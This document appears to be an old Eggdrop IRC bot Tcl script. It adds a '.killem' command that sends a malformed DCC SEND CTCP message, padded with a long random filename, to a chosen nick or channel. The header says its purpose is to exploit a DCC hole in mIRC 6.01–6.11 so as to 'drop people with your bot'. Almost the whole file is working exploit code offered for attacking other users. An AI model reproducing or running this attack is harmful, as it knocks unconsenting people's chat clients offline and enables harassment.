###################################################
## simple partyline controlled script             #
## to exploit the dcc hole in mirc                #
## versions 6.01 -> 6.11                          #
## so you can drop people with your bot           #
## then watch yourself (ban your bot not you) :P  #
##                                                #
## by leprechau@EFet                              #
##                                                #
## to use: .killem <target>                       #
## target can be a channel or nick                #
## that's all she wrote....                       #
###################################################
## begin script..short and sweet ##
##   nothing to edit down here   ##
###################################
##
## NOTE: always check for new code/updates at http://woodstock.anbcs.com/scripts/
## this is the only official location for any of my scripts
##

proc dcc:killem {hand idx text} {
	if {[string equal {} $text]} {
		putlog "\[\002ERROR\002\] Usage: .killem <target>"
		putlog "Where <target> is any valid nick/channel"
		return
	}
	set target [lindex [split $text] 0]
	putcmdlog "Sending spoofed dcc exploit packet to $target...."
	
	set packet ""
	for {set i 0} {$i < 83} {incr i} {
		set x [rand 36]
		append packet "[string index abcdefghijklmnopqrstuvwxyz0123456789 $x] "
	}
	putserv "PRIVMSG $target :\001DCC SEND \"$packet\" 2130706433 [expr round(64511 * rand()) + 1024] [string length $packet]\001"
	putlog "Done!"
}
bind dcc n killem dcc:killem
